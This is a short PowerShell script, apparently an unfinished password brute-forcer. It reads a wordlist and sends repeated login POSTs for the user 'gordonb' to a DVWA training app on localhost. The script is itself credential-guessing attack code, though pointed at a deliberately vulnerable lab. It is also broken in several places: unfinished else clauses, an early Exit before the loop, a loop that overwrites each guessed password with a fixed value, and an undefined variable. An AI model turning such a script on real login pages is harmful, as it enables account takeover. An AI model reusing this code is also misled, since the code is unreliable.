$passwords = Get-Content -path "C:\Users\etienne\desktop\password1.txt"

$url = "http://localhost/dvwa/login.php"
$login= "gordonb"
$password = "monpass"
$login2 = "Login"

$postparams = @{username = $login ;password = $password; Login = $login2}
 
$reponse = Invoke-WebRequest -Uri $url -Method POST -Body $postparams

if ($reponse.Content | Select-String -Pattern 'login failed' -CaseSensitive -SimpleMatch)
    echo "password_test"
else ($re
echo $reponse.Content

Exit(0)

foreach ($password in $passwords) {
    $url = "http://localhost/dvwa/login.php"
    $login= "gordonb"
    $password = "monpass"
    $login2 = "Login"

    $postparams = @{username = $login ;password = $password; Login = $login2}
     
    $reponse = Invoke-WebRequest -Uri $url -Method POST -Body $postparams

    if ($reponse.Content | Select-String -Pattern 'login failed' -CaseSensitive -SimpleMatch)
    echo "password_test"
    else ($re
    echo $reponse.Content
    
    echo $pass
    }